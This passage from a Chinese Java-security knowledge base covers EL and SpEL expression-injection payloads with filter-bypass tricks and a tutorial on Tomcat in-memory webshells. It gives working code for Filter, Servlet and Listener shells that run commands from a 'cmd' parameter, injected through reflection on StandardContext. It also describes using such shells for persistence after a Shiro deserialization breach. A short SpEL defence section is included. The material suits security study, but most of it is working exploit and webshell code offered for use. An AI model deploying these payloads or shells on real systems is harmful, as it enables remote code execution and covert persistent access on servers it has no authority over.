如果要动态取值时，就可以用[]来做，而.无法做到动态取值。例如：${sessionScope.user[data]}中data 是一个变量。 获取变量举例 map = new HashMap<>(); map.put(\"my-name\", \"admin\"); request.setAttribute(\"test\", map); %> 从四个作用域中搜索变量：${name} 从requestScope作用域中获取变量：${requestScope.request} 从sessionScope作用域中获取变量：${sessionScope.session} 从pageScope作用域中获取变量：${pageScope.page} 从applicationScope作用域中获取变量：${applicationScope.application} 从作用域中获取特殊符号变量：${requestScope.test[\"my-name\"]} 操作符 类型 符号 算术型 +、-（二元）、*、/、div、%、mod、-（一元） 逻辑型 and、&&、or、\\ \\ 、!、not 关系型 ==、eq、!=、ne、、gt、=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。 空 empty 空操作符是前缀操作，可用于确定值是否为空。 条件型 A ?B :C 。根据 A 赋值的结果来赋值 B 或 C。 运算符优先级如下（从高到低，从左到右）： [] . () (用于更改运算符的优先) - (一元) not ! empty * / div % mod + - (二元) += <> = lt gt le ge == != eq ne && and || or ? : -> = ; 隐含对象 EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。 语法：${隐式对象名称}：获得对象的引用 序号 隐含对象名称 描 述 1 pageContext 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。） 2 pageScope 代表page域中用于保存属性的Map对象 3 requestScope 代表request域中用于保存属性的Map对象 4 sessionScope 代表session域中用于保存属性的Map对象 5 applicationScope 代表application域中用于保存属性的Map对象 6 param 表示一个保存了所有请求参数的Map对象 7 paramValues 表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[] 8 header 表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”] 9 headerValues 表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”] 10 cookie 表示一个保存了所有cookie的Map对象 11 initParam 表示一个保存了所有web应用初始化参数的map对象 函数 EL表达式语法允许开发人员开发自定义函数，以调用Java类的方法。语法：${prefix：method(params)} 在EL表达式中调用的只能是Java类的静态方法，这个Java类的静态方法需要在TLD文件中描述，才可以被EL表达式调用。 EL自定义函数用于扩展EL表达式的功能，可以让EL表达式完成普通Java程序代码所能完成的功能。 举例： ==>编写一个让所有字符大写的函数 一般来说， EL自定义函数开发与应用包括以下三个步骤： 1、编写一个Java类的静态方法 2、编写标签库描述符（tld）文件，在tld文件中描述自定义函数。 3、在JSP页面中导入和使用自定义函数 1、编写一个Java类的静态方法，代码如下 public class ELFunc { public static String up(String message) { if (message == null){ return null; } return message.toUpperCase(); } } 2、编写标签库描述符（tld）文件，在tld文件中描述自定义函数。 ELFunc.tld位置 代码 1.0 ELFunc --> /ELFunc 子元素用于指定EL自定义函数的名称--> up 子元素用于指定完整的Java类名--> ELFunc 子元素用于指定Java类中的静态方法的签名， 20 方法签名必须指明方法的返回值类型及各个参数的类型，各个参数之间用逗号分隔。--> java.lang.String up(java.lang.String) 3、在JSP页面中导入和使用自定义函数 ${fn:up(\"123aaabbbCCC\")} 实验了好久代码应该是没问题的，但是还是有报错，后面需要再解决这个问题吧，今天是解决不了了，不然一天没了。。。 禁用/启用EL表达式 全局禁用EL表达式，web.xml中进入如下配置： *.jsp true 单个文件禁用EL表达式 在JSP文件中可以有如下定义： 该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。 JSP2.0中默认的启用EL表达式。 EL表达式注入 原理都是一样的：表达式全部或部份外部可控。列一些通用的poc //对应于JSP页面中的pageContext对象（注意：取的是pageContext对象） ${pageContext} //获取Web路径 ${pageContext.getSession().getServletContext().getClassLoader().getResource(\"\")} //文件头参数 ${header} //获取webRoot ${applicationScope} //执行命令 ${pageContext.request.getSession().setAttribute(\"a\",pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\").getInputStream())} EL表达式注入绕过 通过 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤 ${\"xxx\".toString().charAt(0).toChars(97)[0].toString()} ${\"xxx\".toString().charAt(0).toChars(97)[0].toString().concat(\"xxx\".toString().charAt(0).toChars(98)[0].toString())} 通过以上代码，只需要修改toChars()中的ascii码值就可以变成任意字符 参考 javaweb学习总结(二十九)——EL表达式 浅析EL表达式注入漏洞 （很详细） Java EL （Expression Language）表达式注入 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:00:31 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/08.EL表达式/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/09.SpEL表达式/":{"url":"知识库/02.JAVA安全/09.SpEL表达式/","title":"09.SpEL表达式","keywords":"","body":" 介绍 基础使用 pom.xml 基础例子 SpEL语法 SpEL表达式分类 基本表达式 类相关表达式 集合相关表达式 其他表达式 SpEL类相关表达式‼️ 类类型表达式 类实例化 instanceof 表达式 常用payload 绕过方式 防御 参考 介绍 Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。 SpEL的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。 Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。 基础使用 先新建一个Spring项目 pom.xml org.springframework spring-expression 5.2.12.RELEASE 基础例子 一个简单的Controller message为get传入的参数 ExpressionParser接口负责解析表达式字符串 getValue方法执行表达式并返回结果 默认容器是spring本身的容器：ApplicationContext package com.spel.test.demo; import org.springframework.expression.Expression; import org.springframework.expression.ExpressionParser; import org.springframework.expression.spel.standard.SpelExpressionParser; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class HelloController { @GetMapping(\"/test\") public String catUser(String message) { ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); return expression.getValue().toString(); } } 访问 http://127.0.0.1:8080/test?message=T(java.lang.Math).random()*100，可见成功得到一个随机数，说明表达式被执行了 访问 http://127.0.0.1:8080/test?message=new%20java.lang.ProcessBuilder(%22whoami%22).start() 可以直接执行系统命令 SpEL语法 SpEL使用 #{...} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如： 引用其他对象:#{car} 引用其他对象的属性：#{car.brand} 调用其它方法 , 还可以链式操作：#{car.toString()} 其中属性名称引用还可以用$符号 如：${someProperty} 除此以外在SpEL中，使用T()运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的Math类，我们可以像下面的示例这样使用T()运算符： #{T(java.lang.Math)} 演示因为是本地环境，且是将输入的参数直接当成SpEL表达式去执行的，所以没有输入#{}，但是如果用@Value去获取值执行就需要了 @Value(\"#{ T(java.lang.Math).random() * 100.0 }\") private int rand; SpEL表达式分类 基本表达式 字面量表达式、关系，逻辑与算数运算表达式、字符串链接及截取表达式、三目运算、正则表达式以及括号优先级表达式； 类相关表达式 类类型表达式、类实例化、instanceof 表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean 引用； 集合相关表达式 内联 List、内联数组、集合、字典访问、列表、字典； 其他表达式 模版表达式 SpEL类相关表达式‼️ 类类型表达式 使用\"T(Type)\"来表示 java.lang.Class 实例，\"Type\"必须是类全限定名，\"java.lang\"包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。 举例 // java.lang 包类访问 T(String) // 其他包类访问 T(java.lang.Runtime).getRuntime().exec('open -na Calculator') //类静态字段访问 T(Integer).MAX_VALUE //类静态方法调用 T(Integer).parseInt('1') 类实例化 类实例化同样使用 java 关键字「new」，类名必须是全限定名，但 java.lang 包内的类型除外，如 String、Integer。 new java.util.Date() instanceof 表达式 SpEL 支持 instanceof 运算符，跟 Java 内使用同义 \"test\" instanceof T(String) 常用payload ${12*12} T(java.lang.Runtime).getRuntime().exec(\"open -na Calculator\") T(Thread).sleep(10000) #this.getClass().forName('java.lang.Runtime').getRuntime().exec('open -na Calculator') new java.lang.ProcessBuilder('open -na Calculator').start() 回显 引入了org.apache.commons.io这个包的话，可以输出回显 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()) 绕过方式 如果采用关键词过滤，可以采用反射的方式来绕过 T(String).class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open%20-na%20Calculator\") // + 一定要用url编码，不然浏览器解析会有问题 T(String).class.forName(\"java.lang.Ru\"%2b\"ntime\").getMethod(\"getRu\"%2b\"ntime\").invoke(null).exec(\"open%20-na%20Calculator\") T(String).getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).getClass().getMethod(\"exec\",T(String)).invoke(T(java.lang.Runtime).getRuntime(),\"open%20-na%20Calculator\") 使用ScriptEngineManager构造 T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runtime.getRuntime().exec('open -na Calculator')\") T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runt\"%2b\"ime.getRu\"%2b\"ntime().e\"%2b\"xec('open -na Calculator')\") 如果不能使用双引号，那么可以采用生成任意字符+concat函数的形式进行绕过 T(java.lang.Character).toString(97).concat(T(java.lang.Character).toString(98)) 防御 因为SpEL表达式注入漏洞导致攻击者可以通过表达式执行精心构造的任意代码，导致命令执行。为了防御该类漏洞，Spring官方推出了SimpleEvaluationContext作为安全类来防御该类漏洞。 官方文档：https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；所以最直接的修复方式是使用 SimpleEvaluationContext 替换 StandardEvaluationContext。 基础举例 ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(message).build(); return expression.getValue(context).toString(); 参考 Java代码审计之SpEL表达式注入 由浅入深SpEL表达式注入漏洞 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:00:50 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/09.SpEL表达式/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/10.Tomcat内存马基础入门/10.Tomcat内存马基础入门.html":{"url":"知识库/02.JAVA安全/10.Tomcat内存马基础入门/10.Tomcat内存马基础入门.html","title":"10.Tomcat内存马基础入门","keywords":"","body":" Servlet web介绍 创建第一个Servlet web application step 1：使用idea 创建一个 web Application step 2：添加相关的依赖包（$tomcat/lib/servlet-api.jar） step 3：新建Servlet step 4：配置Tomcat step 5：启动项目 Filter 动态注入内存 ServletContext ApplicationContext Filter相关变量 动态注入 JSP Servlet 动态注入内存 Servlet 生命周期 init() 方法 service() 方法 doGet() 方法 doPost() 方法 destroy() 方法 service方法 动态注入 JSP Listener 动态注入内存 ServletRequestListener 接口 动态注入 JSP 总结 https://mp.weixin.qq.com/s/-jXAHHRCRilHrNN49QBcjQ Servlet web介绍 Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。 使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。 Java Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果。但是相比于 CGI，Servlet 有以下几点优势 性能明显更好。 Servlet 在 Web 服务器的地址空间内执行。这样它就没有必要再创建一个单独的进程来处理每个客户端请求。 Servlet 是独立于平台的，因为它们是用 Java 编写的。 服务器上的 Java 安全管理器执行了一系列限制，以保护服务器计算机上的资源。因此，Servlet 是可信的。 Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。 创建第一个Servlet web application step 1：使用idea 创建一个 web Application step 2：添加相关的依赖包（$tomcat/lib/servlet-api.jar） 右键项目 Open Moudle Setting 或者如下箭头的快捷键，添加依赖($tomcat/lib/.jar) step 3：新建Servlet step 4：配置Tomcat 这里有告警，说没有artifacts，首先确定是否Project Structure 下 Module里是否包含我们的项目 以及artifacts里是否有 确定都有再点fix step 5：启动项目 在创建的Servlet(Helloworld.class)中填写如下代码 import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @WebServlet(name = \"HelloWorld\") public class HelloWorld extends HttpServlet { private String message; public void init() throws ServletException{ message = \"This is my first Servlet Application\"; } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // 设置:响应内容类型 response.setContentType(\"text/html\"); // 输出文本 PrintWriter out = response.getWriter(); out.write(\" \" + message + \" \"); } } 然后配置web.xml HelloWorld HelloWorld HelloWorld /hello 然后回到HelloWorld.class，启动web Filter 动态注入内存 Filter是java web中的过滤器，会对客户端发送的请求进行过滤并做一些操作，我们可以在filter中写入命令执行的恶意文件，让客户端请求它来完成命令执行； Filter 内存马是通过动态注册以一个恶意Filter，由于是动态注册的，所以这个filter没有文件实体，存在内存中，当tomcat重启就消失了（恕我直言，解决内存马最好的办法就是重启） 一般我们把这个Filter放在所有的filter最前面优先执行，这样我们的请求就不会受到其他filter的干扰 需要动态注册filter就需要添加filter相关的函数 ServletContext javax.servlet.servletContext中存在addFilter，addServlet，addListener方法，即添加Filter，Servlet，Listener this.getServletContext();，this.getServletConfig().getServletContext(); 是获取ServletContext的方法 ApplicationContext 在Tomcat中，org.apache.catalina.core.ApplicationContext中包含一个ServletContext接口的实现，所以需要引入org.apache.catalina.core.ApplicationContext这个库，用它获取Context Filter相关变量 filterMaps 变量：包含所有过滤器的URL映射关系 filterDefs 变量：包含所有过滤器包括实例内部等变量 filterConfigs 变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理 org.apache.catalina.core.ApplicationFilterConfig 在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef import org.apache.catalina.deploy.FilterMap; import org.apache.catalina.deploy.FilterDef; // tomcat 8/9 import org.apache.tomcat.util.descriptor.web.FilterDef; import org.apache.tomcat.util.descriptor.web.FilterMap; 创建一个Filter，查看结构 package Filter; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import java.io.IOException; @WebFilter(filterName = \"FilterDemo\") public class FilterDemo implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { System.out.println(\"exec filter\"); chain.doFilter(req,resp); } public void init(FilterConfig config) throws ServletException { System.out.println(\"init filter\"); } } FilterDemo中有init，doFilter，destory三个重要方法 init()方法：初始化参数，在创建Filter时自动调用，当我们需要设置初始化参数的时候，可以写到该方法中。 doFilter()方法：拦截到要执行的请求时，doFilter就会执行。这里面写我们对请求和响应的预处理 destory()方法：在销毁Filter时自动调用 对我们来说，init和destory不需要做什么，只需要写一个doFilter方法拦截需要的请求，将其参数用于Runtime.getRuntime().exec()做命令执行，并将返回的数据打印到Response中即可，如下例： public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String cmd = servletRequest.getParameter(\"cmd\"); if (cmd!= null) { Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } filterChain.doFilter(servletRequest, servletResponse); } 动态注入 我们将filter部分写好，下一步就是实现将其注入到内存中 protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { PrintWriter out = response.getWriter(); ServletContext servletContext = request.getSession().getServletContext(); try{ Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\"); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); String name = \"filterDemo\"; //判断是否存在filterDemo这个filter，如果没有则准备创建 if (filterConfigs.get(name) == null){ //定义一些基础属性、类名、filter名等 FilterDemo filter = new FilterDemo(); FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); //添加filterDef standardContext.addFilterDef(filterDef); //创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/* FilterMap filterMap = new FilterMap(); // filterMap.addURLPattern(\"/*\"); filterMap.addURLPattern(\"/xyz\"); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); //添加我们的filterMap到所有filter最前面 standardContext.addFilterMapBefore(filterMap); //反射创建FilterConfig，传入standardContext与filterDef Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); //将filter名和配置好的filterConifg传入 filterConfigs.put(name,filterConfig); out.write(\"Inject success!\"); } else{ out.write(\"Injected!\"); } }catch(Exception e){ e.printStackTrace(); } } JSP Servlet 动态注入内存 要了解Servlet动态注入内存，那么就需要对Servlet的生命周期要有一定的了解 Servlet 生命周期 Servlet 生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程： Servlet 初始化后调用 init () 方法。 Servlet 调用 service() 方法来处理客户端的请求。 Servlet 销毁前调用 destroy() 方法。 最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。 init() 方法 init 方法被设计成只调用一次。它在第一次创建 Servlet 时被调用，在后续每次用户请求时不再调用。因此，它是用于一次性初始化，就像 Applet 的 init 方法一样。 Servlet 创建于用户第一次调用对应于该 Servlet 的 URL 时，但是您也可以指定 Servlet 在服务器第一次启动时被加载。 当用户调用一个 Servlet 时，就会创建一个 Servlet 实例，每一个用户请求都会产生一个新的线程，适当的时候移交给 doGet 或 doPost 方法。init() 方法简单地创建或加载一些数据，这些数据将被用于 Servlet 的整个生命周期 service() 方法 service() 方法是执行实际任务的主要方法。Servlet 容器（即 Web 服务器）调用 service() 方法来处理来自客户端（浏览器）的请求，并把格式化的响应写回给客户端。 每次服务器接收到一个 Servlet 请求时，服务器会产生一个新的线程并调用服务。service() 方法检查 HTTP 请求类型（GET、POST、PUT、DELETE 等），并在适当的时候调用 doGet、doPost、doPut，doDelete 等方法 service() 方法由容器调用，service 方法在适当的时候调用 doGet、doPost、doPut、doDelete 等方法。所以，您不用对 service() 方法做任何动作，您只需要根据来自客户端的请求类型来重写 doGet() 或 doPost() 即可。 doGet() 和 doPost() 方法是每次服务请求中最常用的方法 doGet() 方法 GET 请求来自于一个 URL 的正常请求，或者来自于一个未指定 METHOD 的 HTML 表单，它由 doGet() 方法处理 doPost() 方法 POST 请求来自于一个特别指定了 METHOD 为 POST 的 HTML 表单，它由 doPost() 方法处理 destroy() 方法 destroy() 方法只会被调用一次，在 Servlet 生命周期结束时被调用。destroy() 方法可以让您的 Servlet 关闭数据库连接、停止后台线程、把 Cookie 列表或点击计数器写入到磁盘，并执行其他类似的清理活动。 在调用 destroy() 方法之后，servlet 对象被标记为垃圾回收 service方法 在service方法中，Servlet容器在此生命周期中会处理每次来的请求，就像是“拦截器”一般 // ServletTest import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @WebServlet(name = \"ServletTest\") public class ServletTest extends HttpServlet { @Override public void init() throws ServletException { System.out.println(\"init\"); } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { System.out.println(\"Servlet Service Test\"); } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // 设置:响应内容类型 response.setContentType(\"text/html\"); // 输出文本 PrintWriter out = response.getWriter(); out.write(\" Test \"); } } Helloworld Helloworld Helloworld /hello ServletTest ServletTest ServletTest /test 可以看到每刷新一次，就会打印service生命周期中的Servlet Service Test，而最重要的是没有进入doGet()，相信大家也明白什么意思了 动态注入 我们在service中写入恶意代码，这里还是以ServletTest.java文件为例，已删除web.xml中ServletTest的路由了 import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(name = \"ServletTest\") public class ServletTest extends HttpServlet { @Override public void init() throws ServletException { System.out.println(\"init\"); } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { String cmd = servletRequest.getParameter(\"cmd\"); if (cmd != null) { Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } } 获取context部分与filter中相同,仍然从org.apache.catalina.core.ApplicationContext反射获取 ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 然后需要将上文写的servlet封装成wrapper再使用context添加 ServletTest demo = new ServletTest(); org.apache.catalina.Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(\"xyz\"); wrapper.setLoadOnStartup(1); wrapper.setServlet(demo); wrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(wrapper); standardContext.addServletMapping(\"/xyz\",\"xyz\"); out.println(\"injected Servlet success!\"); 在Helloworld 这个servlet中，我们将代码写入 import org.apache.catalina.Wrapper; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.ServletContext; import javax.servlet.ServletException; import java.io.IOException; import java.io.PrintWriter; import java.lang.reflect.Field; public class Helloworld extends javax.servlet.http.HttpServlet { private String message; public void init() throws ServletException{ message = \"This is my first servlet application\"; } protected void doPost(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException { } protected void doGet(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException { PrintWriter out = response.getWriter(); try { ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ServletTest demo = new ServletTest(); Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(\"xyz\"); wrapper.setLoadOnStartup(1); wrapper.setServlet(demo); wrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(wrapper); // 这里是增加ServletMapping standardContext.addServletMapping(\"/xyz\",\"xyz\"); out.println(\"injected Servlet success!\"); }catch (Exception e){ e.printStackTrace(); } } } 效果如下： JSP 遇到500 不要慌，访问/abc试一试 Listener 动态注入内存 监听器就是监听某个对象的的状态变化的组件，监听器的相关概念： 事件源：被监听的对象 ----- 三个域对象 request session servletContext 监听器：监听事件源对象 事件源对象的状态的变化都会触发监听器 注册监听器：将监听器与事件源进行绑定 响应行为：监听器监听到事件源的状态变化时 所涉及的功能代码ServletRequestListener 接口 该接口实现的方法有requestDestroyed，requestInitialized，分别是在监听request请求结束，以及request请求开始，我们着重看请求开始的部分 ```java import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; public class ListenerDemo implements ServletRequestListener { @Override public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { } } 在`requestInitialized`这个函数中，我们从`servletRequestEvent`参数中取cmd参数，在当前上下文只要在任意路由下监听到了cmd参数存在值，那么就执行命令，具体操作如下 ```java public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmd = servletRequestEvent.getServletRequest().getParameter(\"cmd\"); if(cmd != null){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) {} } } 注意，这里是无回显的 动态注入 在Helloworld这个Servlet中，获取context，并将listener添加进去，具体如下 ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ListenerDemo listenerDemo = new ListenerDemo(); standardContext.addApplicationEventListener(listenerDemo); out.println(\"inject success\"); 因为无回显，所以我们只能执行命令，如弹出计算器 JSP 总结 以上三种根据Servlet的特性，动态注入，jsp文件只要落地，即可动态加载到内存中 姿势 优点 缺点 Filter 1.通过添加全局拦截器对参数进行拦截，来进行恶意代码执行2.通过添加filtermap，可以随便设置路由，所有请求都会过该拦截器 1.引入filterMaps，filterDef，要根据tomcat版本来判断2.代码量较高 Servlet 1. 简单方便，了解Servlet生命周期即可2.更直观了解如何动态添加ServletMapping 1.无法使所有参数都经过恶意代码，只能在我们自己设定的url中才能触发 Listener 1. 简单方便，通过添加监听器对request进行监控2. 在任意url中都能设置我们监听的参数 1. 只要监听的参数含有就会进入监听代码中2. 如果在该jsp页面下访问，则会重放请求 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:27:19 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/10.Tomcat内存马基础入门/10.Tomcat内存马基础入门.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/11.Tomcat内存马无文件攻击/":{"url":"知识库/02.JAVA安全/11.Tomcat内存马无文件攻击/","title":"11.Tomcat内存马无文件攻击","keywords":"","body":" 简介 背景 Tomcat架构原理 Connecter(连接器) ProtocolHandler组件 Endpoint组件 Adapter组件 Container(容器) 请求定位Servlet的过程 Tomcat类加载器 总结 Tomcat 回显 环境 动态注册Filter 反序列化注入Filter 存入request和response 简单分析 测试 注入冰蝎马 request和session对象 pageContext对象 反序列化注入Servlet 注入普通马 注入冰蝎马 反序列化注入Listener 注入普通马 注入冰蝎马 参考链接 简介 在Tomcat内存马基础入门中，只介绍了对应对于在tomcat中，当jsp文件落地之后动态创建filter,servlet,listener，那么当只能代码执行（也就是文件不能落地）的情况下，就需要利用漏洞，通过反序列化写入内存马，在jsp文件中，request是内置对象，在普通java文件中，要通过层层反射去取对应的request，这就是其中的难点之一；以及在代码执行一般就只执行命令，也没有回显，所以使用Tomcat回显命令也是一个很重要的思路 背景 在某HW过程中，通过shiro拿到某单位的门户权限，留后门的过程中发现该CMS不解析jsp，访问直接404，对应路径没有问题，其他诸如js的等文件都能访问，也没有nginx反向代理对jsp文件进行拦截，就只有一个Tomcat开放着80端口，拿到服务器之后解密后台密码，发现也没有对整个站点的配置情况，时间紧，任务重，此时就需要对目标环境进行权限维持，此时不管是Linux权限维持还是Web权限维持，都需要做，这里针对该目标进行web权限维持，通过shiro反序列化来进行内存马植入。 Tomcat架构原理 此部分全部来自P1n93r-Tomcat 架构原理 Tomcat的启动流程如下： startup.sh -> catalina.sh start -> java -jar org.apache.catalina.startup.Bootstrap.main() Tomcat需要实现的2个核心功能： 处理socket连接，负责网络字节流与Request和Response对象的转化 加载并管理Servlet，以及处理具体的Request请求 为此Tomcat设计了两个核心组件： 连接器（Connector）和容器（Container），连接器负责对外交流，容器负责内部处理；同时Tomcat为了实现支持多种IO模型和应用层协议，多个连接器对接一个容器。 Server 对应一个Tomcat实例； Service 默认只有一个，一个Tomcat实例默认一个Service； Connector 一个Service可能多个连接器，接收不同的连接协议； Container 